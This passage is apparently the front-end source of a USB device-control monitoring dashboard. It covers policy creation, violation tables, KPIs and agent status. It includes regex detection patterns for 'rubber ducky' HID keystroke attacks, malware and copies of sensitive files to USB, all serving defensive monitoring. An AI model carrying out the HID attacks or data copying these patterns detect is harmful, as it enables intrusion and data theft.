        <div style={{display:'flex',justifyContent:'space-between',paddingLeft:24,color:MON.sub,fontSize:7,marginTop:5}}><span>00:00</span><span>04:00</span><span>08:00</span><span>12:00</span><span>16:00</span><span>20:00</span><span>24:00</span></div>
        <div style={{display:'flex',justifyContent:'space-between',color:MON.sub,fontSize:8,marginTop:10}}>
          <span>Low Activity</span><span>High Activity</span>
        </div>
      </div>
    </div>
  </div>;
}

function UsbPolicyViolationsTab() {
  const [policies, setPolicies] = useState([]);
  const [violations, setViolations] = useState([]);
  const [total, setTotal] = useState(0);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState('');
  const [form, setForm] = useState({ name: '', description: '', ruleType: 'allow_serials', action: 'audit', values: '', maxMb: '' });
  const load = useCallback(() => Promise.all([
    api.get('/usb-policies'),
    api.get('/usb-policies/violations?days=90&limit=250'),
  ]).then(([policyRes, violationRes]) => {
    setPolicies(policyRes.data?.policies || []);
    setViolations(violationRes.data?.violations || []);
    setTotal(Number(violationRes.data?.total || 0));
    setError('');
  }).catch(err => setError(err.response?.data?.message || 'USB policies could not be loaded')), []);

  useEffect(() => { load(); const timer = setInterval(load, 30000); return () => clearInterval(timer); }, [load]);

  const createPolicy = async event => {
    event.preventDefault();
    if (!form.name.trim()) return setError('Rule name is required');
    setSaving(true);
    try {
      await api.post('/usb-policies', {
        name: form.name.trim(), description: form.description.trim(), ruleType: form.ruleType,
        action: form.action, values: form.values.split(',').map(value => value.trim()).filter(Boolean),
        maxBytes: form.ruleType === 'max_file_size' ? Math.max(0, Number(form.maxMb) || 0) * 1048576 : 0,
      });
      setForm({ name: '', description: '', ruleType: 'allow_serials', action: 'audit', values: '', maxMb: '' });
      await load();
    } catch (err) { setError(err.response?.data?.message || 'Rule creation failed'); }
    finally { setSaving(false); }
  };

  const updatePolicy = async (policy, update) => { await api.patch(`/usb-policies/${policy._id}`, update); await load(); };
  const deletePolicy = async policy => { if (!window.confirm(`Delete USB rule "${policy.name}"?`)) return; await api.delete(`/usb-policies/${policy._id}`); await load(); };
  const needsValues = ['allow_serials', 'block_serials', 'block_vendor', 'block_device_type', 'block_extensions'].includes(form.ruleType);
  const inputStyle = { background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '9px 10px', borderRadius: 6, fontSize: 11, width: '100%' };
  const ruleLabels = { allow_serials: 'Allow only serial numbers', block_serials: 'Block serial numbers', block_vendor: 'Block vendor', block_device_type: 'Block device type', block_sensitive_files: 'Block sensitive files', block_extensions: 'Block file extensions', max_file_size: 'Maximum file size', read_only: 'Force read-only USB' };

  return <div style={{display:'grid',gridTemplateColumns:'360px 1fr',gap:14,color:MON.text}}>
    <form onSubmit={createPolicy} style={{background:MON.card,border:`1px solid ${MON.border}`,borderRadius:8,padding:16,display:'flex',flexDirection:'column',gap:11,alignSelf:'start'}}>
      <div><b style={{fontSize:14}}>＋ Create USB Enforcement Rule</b><div style={{fontSize:9,color:MON.sub,marginTop:4}}>Rules sync to active agents on their next heartbeat.</div></div>
      <input style={inputStyle} placeholder="Rule name" value={form.name} onChange={e=>setForm({...form,name:e.target.value})} />
      <textarea style={{...inputStyle,minHeight:65}} placeholder="Description" value={form.description} onChange={e=>setForm({...form,description:e.target.value})} />
      <select style={inputStyle} value={form.ruleType} onChange={e=>setForm({...form,ruleType:e.target.value})}>{Object.entries(ruleLabels).map(([value,label])=><option key={value} value={value}>{label}</option>)}</select>
      <select style={inputStyle} value={form.action} onChange={e=>setForm({...form,action:e.target.value})}><option value="audit">Audit only</option><option value="block">Block and enforce</option></select>
      {needsValues && <input style={inputStyle} placeholder="Comma-separated values" value={form.values} onChange={e=>setForm({...form,values:e.target.value})} />}
      {form.ruleType === 'max_file_size' && <input style={inputStyle} type="number" min="0" placeholder="Maximum size (MB)" value={form.maxMb} onChange={e=>setForm({...form,maxMb:e.target.value})} />}
      <button disabled={saving} style={{background:MON.cyan,border:0,borderRadius:6,padding:10,fontWeight:900,cursor:'pointer'}}>{saving?'Creating…':'Create & Sync Rule'}</button>
      {error && <div style={{color:MON.red,fontSize:10}}>{error}</div>}
    </form>
    <div style={{display:'flex',flexDirection:'column',gap:14,minWidth:0}}>
      <section style={{background:MON.card,border:`1px solid ${MON.border}`,borderRadius:8,overflow:'hidden'}}>
        <div style={{padding:12,fontWeight:900,borderBottom:`1px solid ${MON.line}`}}>USB Policies ({policies.length})</div>
        {policies.length ? policies.map(policy=><div key={policy._id} style={{display:'grid',gridTemplateColumns:'1.2fr 1fr 80px 72px 70px',gap:10,padding:11,borderTop:`1px solid ${MON.line}`,alignItems:'center',fontSize:10}}><span><b>{policy.name}</b><small style={{display:'block',color:MON.sub,marginTop:3}}>{ruleLabels[policy.ruleType] || policy.ruleType}{policy.values?.length?` · ${policy.values.join(', ')}`:''}</small></span><span style={{color:MON.sub}}>{policy.description || '—'}</span><b style={{color:policy.action==='block'?MON.red:MON.yellow,textTransform:'uppercase'}}>{policy.action}</b><button onClick={()=>updatePolicy(policy,{enabled:!policy.enabled})} style={{background:policy.enabled?`${MON.green}22`:`${MON.red}22`,color:policy.enabled?MON.green:MON.red,border:`1px solid ${policy.enabled?MON.green:MON.red}55`,borderRadius:5,padding:5,cursor:'pointer'}}>{policy.enabled?'Enabled':'Disabled'}</button><button onClick={()=>deletePolicy(policy)} style={{background:'transparent',color:MON.red,border:`1px solid ${MON.red}55`,borderRadius:5,padding:5,cursor:'pointer'}}>Delete</button></div>) : <div style={{padding:24,textAlign:'center',color:MON.sub}}>No USB policies created</div>}
      </section>
      <section style={{background:MON.card,border:`1px solid ${MON.border}`,borderRadius:8,overflow:'auto'}}>
        <div style={{padding:12,fontWeight:900,borderBottom:`1px solid ${MON.line}`}}>Policy Violations — Last 90 Days ({total})</div>
        <div style={{display:'grid',gridTemplateColumns:'130px 1fr 1fr 1fr 80px',gap:10,padding:9,fontSize:9,color:MON.sub,background:MON.card2}}><span>Time</span><span>Policy</span><span>Agent / User</span><span>Device / Details</span><span>Action</span></div>
        {violations.length ? violations.map(row=><div key={row._id} style={{display:'grid',gridTemplateColumns:'130px 1fr 1fr 1fr 80px',gap:10,padding:10,borderTop:`1px solid ${MON.line}`,fontSize:10}}><span>{new Date(row.createdAt).toLocaleString()}</span><b style={{color:MON.orange}}>{row.policyName || row.ruleId}</b><span>{row.agentName || row.hostname || '—'} / {row.username || '—'}</span><span>{row.device || row.description || '—'}</span><b style={{color:row.blocked||row.actionTaken==='Blocked'?MON.red:MON.yellow}}>{row.blocked||row.actionTaken==='Blocked'?'BLOCKED':'AUDIT'}</b></div>) : <div style={{padding:24,textAlign:'center',color:MON.sub}}>No policy violations detected</div>}
      </section>
    </div>
  </div>;
}

export default function UsbDeviceControlDashboard({ alerts = [], loading = false, total = 0 }) {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [usbSystems, setUsbSystems] = useState([]);

  useEffect(() => {
    let active = true;
    const loadAgentStatus = () => api.get('/system')
      .then(response => {
        if (!active) return;
        const rows = response.data?.systems || response.data?.agents || response.data || [];
        setUsbSystems(Array.isArray(rows) ? rows.filter(system => system.usbMonitorEnabled !== false) : []);
      })
      .catch(() => { if (active) setUsbSystems([]); });
    loadAgentStatus();
    const timer = setInterval(loadAgentStatus, 60000);
    return () => { active = false; clearInterval(timer); };
  }, []);

  const liveStats = useMemo(() => {
    const text = a => `${a.type || ''} ${a.ruleId || ''} ${a.eventType || ''} ${a.category || ''} ${a.eventCategory || ''} ${a.description || ''} ${a.actionTaken || ''} ${a.deviceName || ''} ${a.device || ''} ${a.deviceType || ''} ${a.fileAction || ''} ${a.policyName || ''} ${a.malwareType || ''}`;
    const matches = pattern => alerts.filter(a => pattern.test(text(a))).length;
    const connectionAlerts = alerts.filter(a => !/disconnect|remove|unmount/i.test(text(a)) && /connect|insert|mount|device.?add/i.test(text(a)));
    const blocked = alerts.filter(a => a.blocked === true || /block|denied|unauthor/i.test(text(a))).length;
    const fileCopies = matches(/file.?cop|transfer|write|upload|download/i);
    const hid = matches(/hid|rubber.?ducky|keystrok/i);
    const bytesTo = alerts.reduce((sum, a) => sum + (/copied?.?to|write|upload/i.test(text(a)) ? Number(a.bytesTransferred || a.fileSize || a.rawEvent?.bytes_transferred || 0) : 0), 0);
    const bytesFrom = alerts.reduce((sum, a) => sum + (/copied?.?from|read|download/i.test(text(a)) ? Number(a.bytesTransferred || a.fileSize || a.rawEvent?.bytes_transferred || 0) : 0), 0);
    const formatBytes = n => n >= 1073741824 ? `${(n / 1073741824).toFixed(1)} GB` : n >= 1048576 ? `${(n / 1048576).toFixed(1)} MB` : n >= 1024 ? `${(n / 1024).toFixed(1)} KB` : `${n} B`;
    const timeline = Array(18).fill(0);
    const devices = {};
    const types = {};
    const agentMap = {};
    const now = Date.now();
    alerts.forEach(a => {
      const created = new Date(a.createdAt || a.timestamp || 0).getTime();
      const daysAgo = Math.floor((now - created) / 86400000);
      if (Number.isFinite(daysAgo) && daysAgo >= 0 && daysAgo < 90) timeline[Math.min(17, Math.max(0, 17 - Math.floor(daysAgo * 18 / 90)))]++;
      const name = a.deviceName || a.device || a.rawEvent?.device_name || 'Unknown device';
      devices[name] = (devices[name] || 0) + 1;
      const type = a.deviceType || a.rawEvent?.device_type || (/mobile|phone|mtp/i.test(text(a)) ? 'Mobile Device' : /hdd|ssd/i.test(text(a)) ? 'External HDD/SSD' : /hid|keyboard/i.test(text(a)) ? 'HID Device' : 'USB Storage Drive');
      types[type] = (types[type] || 0) + 1;
      const agentKey = a.agentId || a.agentName || a.systemId?._id || a.systemId || 'unknown';
      const agent = agentMap[agentKey] || (agentMap[agentKey] = { key: String(agentKey), name: a.agentName || a.hostname || 'Unknown agent', events: 0, files: 0, bytes: 0, violations: 0, malware: 0, lastSeen: null });
      agent.events += 1;
      if (a.fileAction || /file.?cop|transfer/i.test(text(a))) agent.files += 1;
      agent.bytes += Number(a.bytesTransferred || a.fileSize || a.rawEvent?.bytes_transferred || a.rawEvent?.file_size || 0);
      if (a.policyName || /policy|blocked|denied/i.test(text(a))) agent.violations += 1;
      if (a.malwareType || a.eventCategory === 'malware' || /malware|virus|trojan/i.test(text(a))) agent.malware += 1;
      if (!agent.lastSeen || created > new Date(agent.lastSeen).getTime()) agent.lastSeen = a.createdAt || a.timestamp;
    });

    return {
      connected: connectionAlerts.length, activeDevices: Object.keys(devices).filter(name => name !== 'Unknown device').length,
      authorized: connectionAlerts.filter(a => !(a.blocked === true || /block|denied|unauthor/i.test(text(a)))).length,
      unauthorized: connectionAlerts.filter(a => a.blocked === true || /block|denied|unauthor/i.test(text(a))).length,
      blocked: connectionAlerts.filter(a => a.blocked === true || /block|denied/i.test(text(a))).length,
      fileCopies, copiedToUsb: formatBytes(bytesTo), copiedFromUsb: formatBytes(bytesFrom),
      sensitiveCopies: matches(/sensitive|confidential|secret|dlp/i), malwareDetected: matches(/malware|virus|trojan/i),
      hidAttacks: hid, duckyCount: matches(/rubber.?ducky/i), driversInstalled: matches(/driver.*install/i),
      policyViolations: matches(/policy|violation|blocked|denied/i), writeBlockEvents: matches(/write.?block/i),
      readEvents: matches(/read|copied?.?from|download/i), storageMounted: matches(/mount|storage/i),
      extHDDConnected: matches(/external|hdd|ssd/i), mobileConnected: matches(/mobile|phone|mtp/i), networkAdapters: matches(/network.?adapter|ethernet/i),
      timeline,
      topDevices: Object.entries(devices).sort((a,b) => b[1] - a[1]).slice(0,5),
      topTypes: Object.entries(types).sort((a,b) => b[1] - a[1]).slice(0,5),
      agentRows: Object.values(agentMap).sort((a,b) => b.events - a.events),
    };
  }, [alerts, total]);

  const kpis = [
    ['Total USB Devices Connected', 'connected', MON.blue], ['Active USB Devices', 'activeDevices', MON.cyan],
    ['Authorized Devices', 'authorized', MON.green], ['Unauthorized Devices', 'unauthorized', MON.orange],
    ['Blocked Devices', 'blocked', MON.red], ['File Copies Today', 'fileCopies', MON.purple],
    ['Data Copied to USB', 'copiedToUsb', MON.yellow], ['Data Copied from USB', 'copiedFromUsb', MON.blue],
    ['Sensitive File Copies', 'sensitiveCopies', MON.red], ['Malware Detected from USB', 'malwareDetected', MON.red],
    ['HID Attack Attempts', 'hidAttacks', MON.orange], ['Rubber Ducky Detection', 'duckyCount', MON.red],
    ['Driver Installations', 'driversInstalled', MON.yellow], ['Policy Violations', 'policyViolations', MON.orange],
    ['USB Write Block Events', 'writeBlockEvents', MON.yellow], ['USB Read Events', 'readEvents', MON.cyan],
    ['USB Storage Mounted', 'storageMounted', MON.blue], ['External HDD Connected', 'extHDDConnected', MON.purple],
    ['Mobile Devices Connected', 'mobileConnected', MON.orange], ['USB Network Adapter Detection', 'networkAdapters', MON.red],
  ].map(([label, key, color]) => ({ label, val: liveStats[key], trend: 'LIVE', color, data: liveStats.timeline }));
  const agentStatusRows = usbSystems.map(system => {
    const systemKey = String(system.agentKey || system.agentId || system._id || '');
    const metrics = liveStats.agentRows.find(row => row.key === systemKey || systemKey.startsWith(row.key) || row.key.startsWith(systemKey) || row.name === system.name || row.name === system.hostname);
    return {
      key: system._id || systemKey,
      name: system.name || system.hostname || metrics?.name || 'Unknown agent',
      hostname: system.hostname || '—',
      status: system.status || 'unknown',
      monitor: system.usbMonitorEnabled !== false,
      lastSeen: system.lastSeen || metrics?.lastSeen,
      events: metrics?.events || 0,
      files: metrics?.files || 0,
      bytes: metrics?.bytes || 0,
      violations: metrics?.violations || 0,
      malware: metrics?.malware || 0,
    };
  });
  liveStats.agentRows.forEach(metrics => {
    if (!agentStatusRows.some(row => row.name === metrics.name || String(row.key).startsWith(metrics.key))) {
      agentStatusRows.push({ ...metrics, hostname: '—', status: 'reporting', monitor: true });
    }
  });
  const formatAgentBytes = n => n >= 1073741824 ? `${(n / 1073741824).toFixed(1)} GB` : n >= 1048576 ? `${(n / 1048576).toFixed(1)} MB` : n >= 1024 ? `${(n / 1024).toFixed(1)} KB` : `${Number(n || 0)} B`;

  return (
    <div style={{ background: MON.bg, color: MON.text, display: 'flex', height: '100%', minHeight: 0, overflow: 'hidden' }}>
      <aside style={{ width: 235, flexShrink: 0, background: MON.card2, borderRight: `1px solid ${MON.border}`, padding: 14, display: 'flex', flexDirection: 'column', gap: 8 }}>
        {[
          { id: 'dashboard', icon: '📊', label: 'Dashboard', activeColor: MON.blue },
          { id: 'monitoring', icon: '📊', label: 'Monitoring', activeColor: MON.cyan },
          { id: 'policy-violations', icon: '⚖', label: 'Policy Violations', activeColor: MON.orange },
          { id: 'log-monitor', icon: '📜', label: 'Logs (SIEM Table)', activeColor: MON.cyan },
          { id: 'reports', icon: '📄', label: 'Reports', activeColor: MON.purple },
        ].map(item => {
          const selected = activeTab === item.id;
          return (
            <button
              key={item.id}
              type="button"
              onClick={() => setActiveTab(item.id)}
              aria-current={selected ? 'page' : undefined}
              style={{
                width: '100%', display: 'flex', alignItems: 'center', gap: 10,
                background: selected ? item.activeColor : 'transparent',
                color: selected ? (item.id === 'reports' ? '#fff' : '#000') : MON.text,
                border: selected ? `1px solid ${item.activeColor}` : '1px solid transparent',
                padding: '10px 12px', borderRadius: 7, fontSize: 12, fontWeight: 800,
                textAlign: 'left', cursor: 'pointer',
              }}
            >
              <span aria-hidden="true">{item.icon}</span>
              <span>{item.label}</span>
            </button>
          );
        })}
      </aside>

      <main style={{ flex: 1, minWidth: 0, padding: 16, display: 'flex', flexDirection: 'column', gap: 16, overflowY: 'auto' }}>

      {activeTab === 'log-monitor' ? (
        <UsbLogMonitor alerts={alerts} />
      ) : activeTab === 'policy-violations' ? (
        <UsbPolicyViolationsTab />
      ) : activeTab === 'reports' ? (
        <UsbReportsTab alerts={alerts} />
      ) : activeTab === 'dashboard' ? (
        <UsbOverviewDashboard alerts={alerts} total={total} />
      ) : (
        <>
          {/* 20 Top KPI Cards Grid */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 12 }}>
            {kpis.map((kpi, i) => (
              <div key={i} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 12, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                  <div style={{ fontSize: 11, fontWeight: 700, color: MON.muted }}>{kpi.label}</div>
                  <span style={{ fontSize: 9, fontWeight: 800, color: MON.green, background: 'rgba(0,0,0,0.3)', padding: '2px 6px', borderRadius: 4 }}>{kpi.trend}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', marginTop: 10 }}>
                  <div style={{ fontSize: 22, fontWeight: 900, color: kpi.color }}>{kpi.val}</div>
                  <div style={{ width: 70 }}><MiniSparkline data={kpi.data} color={kpi.color} height={24} /></div>
                </div>
              </div>
            ))}
          </div>

          <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, overflow: 'hidden' }}>
            <div style={{padding:'11px 14px',borderBottom:`1px solid ${MON.line}`,display:'flex',justifyContent:'space-between',alignItems:'center'}}>
              <div style={{fontSize:12,fontWeight:900,color:'#fff'}}>🛰 Agent-Level USB Monitoring</div>
              <div style={{fontSize:9,color:MON.green}}>● {agentStatusRows.filter(row => row.status === 'active' || row.status === 'reporting').length} reporting · 15s refresh</div>
            </div>
            <div style={{display:'grid',gridTemplateColumns:'1fr 1fr 80px 82px 76px 76px 92px 80px 120px',gap:8,padding:'9px 12px',background:MON.card2,color:MON.muted,fontSize:9,fontWeight:800}}>
              <span>Agent</span><span>Hostname</span><span>Status</span><span>USB Monitor</span><span>Events</span><span>Files</span><span>Transferred</span><span>Threats</span><span>Last Seen</span>
            </div>
            {agentStatusRows.length ? agentStatusRows.map(row => (
              <div key={row.key || row.name} style={{display:'grid',gridTemplateColumns:'1fr 1fr 80px 82px 76px 76px 92px 80px 120px',gap:8,padding:'10px 12px',borderTop:`1px solid ${MON.line}`,fontSize:10,alignItems:'center'}}>
                <b style={{color:MON.cyan}}>{row.name}</b><span>{row.hostname}</span>
                <b style={{color:row.status === 'active' || row.status === 'reporting' ? MON.green : MON.red,textTransform:'uppercase'}}>{row.status}</b>
                <span style={{color:row.monitor ? MON.green : MON.red}}>{row.monitor ? 'Enabled' : 'Disabled'}</span>
                <b>{row.events}</b><b>{row.files}</b><b>{formatAgentBytes(row.bytes)}</b>
                <b style={{color:row.malware || row.violations ? MON.red : MON.green}}>{Number(row.malware || 0) + Number(row.violations || 0)}</b>
                <span style={{color:MON.sub}}>{row.lastSeen ? new Date(row.lastSeen).toLocaleString() : 'Never'}</span>
              </div>
            )) : <div style={{padding:24,textAlign:'center',color:MON.muted,fontSize:11}}>No USB-enabled agents found</div>}
          </div>

          {/* Charts Row */}
          <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr 1fr', gap: 14 }}>
            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>📊 USB Activity & Connection Timeline (90 Days)</div>
              <div style={{ height: 140, display: 'flex', alignItems: 'flex-end', gap: 8, borderBottom: `1px solid ${MON.line}` }}>
                {liveStats.timeline.map((val, idx) => (
                  <div key={idx} title={`${val} events`} style={{ flex: 1, height: `${val ? Math.max(4, (val / Math.max(...liveStats.timeline, 1)) * 100) : 0}%`, background: MON.cyan, borderRadius: '2px 2px 0 0' }} />
                ))}
              </div>
            </div>

            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>🔌 Top Connected Devices</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 11 }}>
                {liveStats.topDevices.map(([dev, count], index) => (
                  <div key={dev} style={{ display: 'flex', justifyContent: 'space-between' }}>
                    <span style={{ color: MON.text, fontWeight: 700 }}>{dev}</span>
                    <span style={{ color: [MON.blue, MON.cyan, MON.purple][index % 3], fontWeight: 800 }}>{count} events</span>
                  </div>
                ))}
                {!liveStats.topDevices.length && <div style={{color:MON.muted}}>No live device data</div>}
              </div>
            </div>

            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>📦 Device Type Distribution</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 11 }}>
                {liveStats.topTypes.map(([type, count], index) => (
                  <div key={type} style={{ display: 'flex', justifyContent: 'space-between' }}>
                    <span style={{ color: MON.muted }}>{type}</span>
                    <span style={{ color: [MON.cyan, MON.blue, MON.purple][index % 3], fontWeight: 800 }}>{alerts.length ? Math.round((count / alerts.length) * 100) : 0}%</span>
                  </div>
                ))}
                {!liveStats.topTypes.length && <div style={{color:MON.muted}}>No live type data</div>}
              </div>
            </div>
          </div>
        </>
      )}
      </main>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 4. OVERLAY CAPABILITY MODAL EXPORT
// ═════════════════════════════════════════════════════════════════════════════
export function CapabilityPage() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { company, user } = useAuth();
  const fromDashboard = searchParams.get('from') === 'dashboard';
  const companyId = company?._id || user?.companyId?._id || user?.companyId;

  const [alerts, setAlerts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [total, setTotal] = useState(0);

  const loadAlerts = useCallback(async (quiet = false) => {
    if (!quiet) setLoading(true);
    try {
      const capabilityId = 10;
      const q = new URLSearchParams({ page: 1, limit: 5000, capabilityId, windowHours: 24 });

      // The USB endpoint is the canonical live source. It includes USB events
      // plus USB-originated file/malware/EDR findings under one DB count.
      let r = await api.get(`/dashboard/alerts/usb?${q}`);
      let fetchedAlerts = r.data?.alerts || [];
      let fetchedTotal = r.data?.total || fetchedAlerts.length;

      if (!fetchedAlerts.length) {
        try {
          r = await api.get(`/dashboard/alerts/edr?${q}`);
          fetchedAlerts = r.data?.alerts || [];
          fetchedTotal = r.data?.total || fetchedAlerts.length;
        } catch (e) { /* ignore */ }
      }

      if (!fetchedAlerts.length) {
        try {
          r = await api.get(`/dashboard/alerts/all?${q}`);
          const allAlerts = r.data?.alerts || [];
          fetchedAlerts = allAlerts.filter(a => /usb|device|removable|storage/i.test(`${a.description || ''} ${a.ruleId || ''} ${a.device || ''}`));
          fetchedTotal = fetchedAlerts.length;
        } catch (e) { /* ignore */ }
      }

      setAlerts(fetchedAlerts);
      setTotal(fetchedTotal);
    } catch (err) {
      console.warn('[USB Realtime Fetch Warning]', err);
    } finally {
      if (!quiet) setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadAlerts(false);
    const interval = setInterval(() => loadAlerts(true), 30000);
    return () => clearInterval(interval);
  }, [loadAlerts]);

  useEffect(() => {
    const socket = io(SOCKET_URL, { ...socketOptions, transports: ['polling', 'websocket'] });
    const join = () => { if (companyId) socket.emit('join:company', companyId); };
    socket.on('connect', join);
    socket.on('alert:new', (newAlert) => {
      if (newAlert) {
        setAlerts(prev => [newAlert, ...prev]);
      }
      loadAlerts(true);
    });
    socket.on('usb:event', (newAlert) => {
      if (newAlert) {
        setAlerts(prev => [newAlert, ...prev]);
      }
      loadAlerts(true);
    });
    socket.on('telemetry:new', () => loadAlerts(true));
    join();
    const disc = connectSocket(socket);
    return () => {
      socket.off('connect', join);
      socket.off('alert:new');
      socket.off('usb:event');
      socket.off('telemetry:new');
      disc();
    };
  }, [companyId, loadAlerts]);

  const handleClose = () => navigate(fromDashboard ? '/' : '/edr', { replace: true });

  return (
    <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000 }} onClick={e => { if (e.target === e.currentTarget) handleClose(); }}>
      <div style={{ background: '#0c1a2e', border: '1px solid #1e3a5f', borderRadius: 12, width: 'calc(100vw - 8px)', height: 'calc(100vh - 8px)', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 18px', borderBottom: '1px solid #1e3a5f', flexShrink: 0 }}>
          <h3 style={{ margin: 0, fontSize: 15, color: '#e0f2fe' }}>🛡️ 10. Device Control (USB) Monitoring</h3>
          <button type="button" onClick={handleClose} style={{ background: 'none', border: 'none', color: '#60a5fa', fontSize: 20, cursor: 'pointer' }}>✕</button>
        </div>
        <UsbDeviceControlDashboard alerts={alerts} loading={loading} total={total} />
      </div>
    </div>
  );
}

export function UsbSubTabPage() {
  return <CapabilitySubTabPage kind="usb" />;
}
